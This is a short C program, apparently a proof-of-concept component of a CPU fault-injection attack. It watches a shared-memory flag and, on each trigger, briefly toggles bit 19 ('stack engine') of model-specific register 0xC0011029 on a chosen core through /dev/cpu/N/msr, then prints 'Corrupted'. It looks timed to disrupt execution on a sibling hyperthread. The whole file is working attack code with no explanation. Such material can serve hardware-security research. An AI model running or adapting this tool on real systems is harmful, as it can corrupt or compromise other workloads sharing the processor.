#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define MSR_REG 0xC0011029ULL
#define STACKENGINE_BIT (1ULL << 19)
#define SHM_NAME "ht_toggle_shm"

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <core_id>\n", argv[0]);
        return EXIT_FAILURE;
    }

    int core = atoi(argv[1]);
    char msr_path[64];
    snprintf(msr_path, sizeof(msr_path), "/dev/cpu/%d/msr", core);

    int fd = open(msr_path, O_RDWR);
    if (fd < 0) {
        perror("open msr device");
        return EXIT_FAILURE;
    }

    int shm_fd = shm_open(SHM_NAME, O_RDONLY, 0);
    if (shm_fd < 0) {
        perror("shm_open");
        close(fd);
        return EXIT_FAILURE;
    }
    volatile uint32_t *flag = mmap(NULL, sizeof(uint32_t), PROT_READ, MAP_SHARED, shm_fd, 0);
    if (flag == MAP_FAILED) {
        perror("mmap");
        close(shm_fd);
        close(fd);
        return EXIT_FAILURE;
    }

    uint64_t cur;
    if (pread(fd, &cur, sizeof(cur), MSR_REG) != sizeof(cur)) {
        perror("pread");
        close(fd);
        return EXIT_FAILURE;
    }
    uint64_t enabled = cur | STACKENGINE_BIT;
    uint64_t disabled = cur & ~STACKENGINE_BIT;

    printf("Init: %s\n", cur == enabled ? "ENABLED" : "DISABLED");

    uint32_t last_state = 1;
    while (1) {
        asm volatile("clflush (%0); mfence\n" ::"r"(flag));
        uint32_t state = *flag;
        if (state && !last_state) {
            if (pwrite(fd, &enabled, sizeof(enabled), MSR_REG) != sizeof(enabled)) {
                perror("pwrite enable");
                break;
            }
            if (pwrite(fd, &disabled, sizeof(disabled), MSR_REG) != sizeof(disabled)) {
                perror("pwrite disable");
                break;
            }
            printf("Corrupted\n");
        }
        last_state = state;
        usleep(1000);
    }

    munmap(flag, sizeof(uint32_t));
    close(shm_fd);
    close(fd);
    return EXIT_SUCCESS;
}
